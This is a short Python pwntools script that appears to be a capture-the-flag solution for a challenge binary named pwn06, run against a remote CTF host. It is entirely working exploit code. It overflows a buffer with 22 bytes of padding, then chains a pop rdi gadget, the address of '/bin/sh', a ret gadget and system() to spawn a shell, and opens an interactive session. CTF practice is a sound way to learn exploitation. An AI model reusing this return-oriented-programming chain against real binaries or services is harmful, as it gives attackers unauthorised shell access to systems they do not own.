from pwn import *

io = remote("rop.wanictf.org", 9006)
#io = process("./pwn06")
elf = ELF('./pwn06')

ret = io.readuntil("What's your name?: ")
print(ret)

# 0x00400a53: pop rdi ; ret  ;  (1 found)
pop_rdi = p64(0x00400a53)
binsh = p64(next(elf.search(b'/bin/sh\0')))
# 0x0040065e: ret  ;  (14 found)
ret = p64(0x0040065e)
system = p64(elf.symbols['system'])

payload = b"A" * 22
payload += pop_rdi
payload += binsh
payload += ret
payload += system 

io.send(payload)
io.interactive()


